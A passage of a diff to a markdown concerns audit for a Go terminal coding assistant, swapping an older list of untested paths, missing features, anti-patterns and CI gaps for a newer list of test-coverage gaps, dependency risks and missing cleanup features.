-- **What's not tested:** Log rotation, file retention, M31A_LOG_FORMAT
-  text vs JSON dispatch.
-- **Files:** `internal/log/log.go` (log_test.go exists but covers
-  trivial paths)
-- **Risk:** Rotation bugs only surface after 24+ hours of uptime.
-- **Priority:** Medium.
-
-### No integration test for full workflow with mock LLM
-
-- **What's not tested:** End-to-end Initialize → Discuss → Plan →
-  Execute → Verify → Ship against a mocked provider. The
-  `internal/workflow/integration_test.go` exists but its scope is
-  unclear from grep.
-- **Files:** `internal/workflow/integration_test.go`
-- **Risk:** Phase transitions and the context-pruning contract can
-  regress silently.
-- **Priority:** High (acceptance criterion 8).
-
-### Self-heal boundary cases
-
-- **What's not tested:** `MaxHealAttempts = 2` boundary, the
-  post-bisect heal path, and the "skipped on dependency failure"
-  cascade in `taskrunner.Schedule`.
-- **Files:** `pkg/taskrunner/runner.go`, `internal/workflow/verify.go`
-- **Risk:** Bugs in retry counting (see "Self-heal loop off-by-one"
-  above) can cause infinite loops or premature failure.
-- **Priority:** High.
+**`github.com/BurntSushi/toml`:**
+- Risk: Used in `internal/config/loader.go` for TOML parsing. The `v1` package is in maintenance mode; `v2` has a different API.
+- Impact: Medium — config loading is critical path.
+- Migration plan: When upgrading to v2, update `toml.DecodeFile` calls and struct tags.
 
 ## Missing Critical Features
 
-### `/optimize` for model arbitrage
+**Backup pruning:**
+- Problem: FileWrite creates backups on every write with no cleanup. Over a long coding session, the backup directory can grow to hundreds of megabytes.
+- Blocks: Long-running sessions and production use.
 
-- **Problem:** Acceptance criterion 22 requires `/optimize` to
-  suggest cheaper model alternatives with savings percentage and an
-  `O` key to accept all. Neither exists. The arbitrage logic is
-  implemented in `pkg/arbitrage/arbitrage.go` and used only for
-  silent auto-arbitrage in `repl.go:451-470`.
-- **Blocks:** Cost-savings UX promised to users.
-- **Fix approach:** Add `/optimize` slash command that calls
-  `arbitrage.SuggestAll` and renders a table; add an `O` keybinding
-  in Plan screen.
+**Session auto-cleanup:**
+- Problem: Old sessions are never removed from disk. Users must manually delete `~/.m31a/sessions/` contents.
+- Blocks: Disk space management on long-lived installations.
 
-### `/pause` and `/resume-task` for workflow control
+**Config hot-reload:**
+- Problem: Configuration is loaded once at startup. Changes to `~/.m31a/config.toml` require restarting the TUI.
+- Blocks: Users who want to adjust settings without losing their session.
 
-- **Problem:** Acceptance criterion 19 lists these but they don't
-  exist. The Execute screen has a `P` keybinding mentioned in the
-  original spec but `internal/tui/execute.go` only handles
-  `up/down/s/S`.
-- **Blocks:** User cannot pause a long-running execute phase.
+## Test Coverage Gaps
 
-### Test mode without API key
+**`internal/tui/app_update.go`:**
+- What's not tested: The `Update()` message handler (1238 lines) is tested indirectly through `app_test.go` but has no dedicated test file. Many message type handlers are untested.
+- Files: `internal/tui/app_update.go`
+- Risk: Regressions in message handling go undetected.
+- Priority: High
 
-- **Problem:** There is no way to launch M31A without a key to
-  explore the UI. The first-run "Skip" option (`firstrun.go:165-168`)
-  lands in the REPL with "No API key configured" — but most commands
-  still try to hit the network and fail with cryptic errors.
-- **Blocks:** Onboarding demos, screenshots, CI smoke tests.
-- **Fix approach:** Detect the no-key state in `app.go` and route
-  `/commands` that don't need a model to a stub response.
+**`internal/tools/permissions.go`:**
+- What's not tested: `matchAnyParamValue()`, `matchToolName()`, and the full permission check flow with glob patterns have no dedicated test file.
+- Files: `internal/tools/permissions.go`
+- Risk: Permission rule matching regressions could allow unauthorized tool execution.
+- Priority: High
 
-## Anti-Patterns Observed
+**Command implementations:**
+- What's not tested: `commands_ai.go`, `commands_config.go`, `commands_git.go`, `commands_session.go`, `commands_workflow.go` have no test files.
+- Files: `internal/tui/commands_ai.go`, `internal/tui/commands_config.go`, `internal/tui/commands_git.go`, `internal/tui/commands_session.go`, `internal/tui/commands_workflow.go`
+- Risk: Slash command regressions go undetected.
+- Priority: Medium
 
-### `panic` used for control flow in `Register` paths
+**`internal/tui/repl_stream.go`:**
+- What's not tested: Stream segment building and message assembly logic.
+- Files: `internal/tui/repl_stream.go`
+- Risk: Streaming display regressions.
+- Priority: Medium
 
-- **Where:** `internal/tools/dispatcher.go:66`,
-  `internal/provider/registry.go:24`
-- **Why wrong:** Panics in library code surface as 500-equivalent
-  crashes in `main`. Returning an `error` is idiomatic and lets
-  callers recover.
-- **Do this instead:** Return `error` from `Register`; let `main`
-  decide.
+**`internal/tui/repl_quickactions.go`:**
+- What's not tested: Quick action handling.
+- Files: `internal/tui/repl_quickactions.go`
+- Risk: Low — UI convenience feature.
 
-### V1 placeholders remain in shipped code
+**OS-specific keychain implementations:**
+- What's not tested: `keychain_linux.go`, `keychain_darwin.go`, `keychain_windows.go` have compile-tag guards that prevent cross-platform testing. Only `keychain_test.go` (shared logic) is tested.
+- Files: `pkg/keychain/keychain_linux.go`, `pkg/keychain/keychain_darwin.go`, `pkg/keychain/keychain_windows.go`
+- Risk: OS-specific keychain integration may fail on certain desktop environments.
+- Priority: Medium
 
-- **Where:** `internal/tui/plan.go:70`, `internal/tui/ship.go:57`,
-  `internal/tui/commands.go:658`, `pkg/keychain/keychain.go:32`
-- **Why wrong:** The CHANGELOG says v1.0.0 shipped 2026-05-29. The
-  `// V1: placeholder` comments indicate incomplete work, not deferred
-  work.
-- **Do this instead:** Either complete the feature, remove the
-  keybinding/hint, or move to a `v1.1` TODO with a tracked issue.
-
-### `os.Getenv("HOME")` instead of `os.UserHomeDir()`
-
-- **Where:** `internal/workflow/ship.go:80-82` (only occurrence in
-  the codebase; every other file uses `os.UserHomeDir()`).
-- **Why wrong:** Inconsistent; fails on systems with unusual env
-  (snap, flatpak, chroots).
-- **Do this instead:** `home, err := os.UserHomeDir()`.
-
-### `fmt.Printf` in library code (already fixed in loader.go but still present elsewhere?)
-
-- **Where to audit:** The previous audit flagged loader.go. Verify
-  no other package uses `fmt.Print*` for diagnostic output.
-  `internal/provider/openrouter/client.go:127-150` uses
-  `log.Printf` (stdlib log, not slog) for model fetch errors —
-  inconsistent with the rest of the codebase.
-- **Do this instead:** Use `slog.Warn`/`slog.Error` via a
-  package-level logger.
-
-## Cross-Cutting Concerns
-
-### `gofmt`/`goimports` not enforced in CI
-
-- **Where:** `.github/workflows/ci.yml` only runs `golangci-lint`.
-- **Risk:** Code style drift across contributors.
-- **Fix:** Add a `gofmt -l .` step that fails on diff.
-
-### No `-race` enforcement across packages
-
-- **Where:** `.github/workflows/ci.yml` does run `go test -race`,
-  but goroutines added during V1.0 phases (`shell mode`, streaming
-  channel) were not covered by the race tests added in Phase 1.
-- **Risk:** Data races in the streaming path surface only under
-  load (e.g. mid-cancellation).
-- **Fix:** Add `go test -race -count=1` to release tag pipeline.
-
-### `panic` recovery in Bubble Tea `Update`
-
-- **Where:** `internal/tui/app.go:445` (Update entry point).
-- **Risk:** A panic in any screen's `Update` crashes the entire
-  TUI. There is no `tea.Recover` middleware wrapping the program.
-- **Fix:** Use `tea.NewProgram(app, tea.WithAltScreen())` with
-  `tea.WithoutCatchPanics()` (default is to catch — verify intent).
+**Error handling patterns — discarded errors in workflow:**
+- What's not tested: Error paths in `ship.go` (git log failure), `execute.go` (git HeadHash failure) are silently discarded. No tests verify behavior when these operations fail.
+- Files: `internal/workflow/ship.go:62`, `internal/workflow/execute.go:247,344`
+- Risk: Silent data loss in commit tracking and ship summary.
+- Priority: Medium
 
 ---
 
-*Concerns audit: 2026-06-02*
+*Concerns audit: 2026-06-04*
